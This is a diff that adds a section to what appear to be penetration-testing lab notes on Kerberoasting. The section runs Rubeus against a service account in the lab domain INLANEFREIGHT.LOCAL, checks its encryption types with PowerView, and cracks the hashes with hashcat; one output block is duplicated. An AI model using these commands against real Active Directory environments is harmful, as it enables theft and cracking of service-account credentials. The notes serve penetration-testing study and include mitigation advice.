@@ -366,6 +366,66 @@ Stopped: Thu Feb 24 22:03:11 2022
 
 
 
+### Automating Windows Kerberoasting w/ Rubeus
+
+```powershell
+PS C:\attacker> .\Rubeus.exe kerberoast /user:testspn /nowrap
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target User            : testspn
+[*] Target Domain          : INLANEFREIGHT.LOCAL
+[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=testspn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 1
+
+```
+
+<figure><img src="../../.gitbook/assets/Screenshot 2023-09-25 124829.png" alt=""><figcaption></figcaption></figure>
+
+```
+PS C:\attacker> .\Rubeus.exe kerberoast /user:testspn /nowrap
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target User            : testspn
+[*] Target Domain          : INLANEFREIGHT.LOCAL
+[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=testspn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 1
+
+```
+
+Checking with PowerView, we can see that the `msDS-SupportedEncryptionTypes` attribute is set to `0`. The chart [here](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797) tells us that a decimal value of `0` means that a specific encryption type is not defined and set to the default of `RC4_HMAC_MD5`.
+
+```powershell-session
+PS C:\attacker> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+
+serviceprincipalname                   msds-supportedencryptiontypes samaccountname
+--------------------                   ----------------------------- --------------
+testspn/kerberoast.inlanefreight.local                            0 testspn
+```
+
+
+
+### Crack with Hashcat
+
+```shell-session
+attacker@kali$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
+hashcat (v6.1.1) starting...
+[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s
+
+[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =>
+```
+
+
+
 ## Mitigation & Detection
 
 An important mitigation for non-managed service accounts is to set a long and complex password or passphrase that does not appear in any word list and would take far too long to crack. It is recommended to use [Managed Service Accounts (MSA)](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009), and [Group Managed Service Accounts (gMSA)](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview), which use very complex passwords, and automatically rotate on a set interval (like machine accounts) or accounts set up with LAPS.
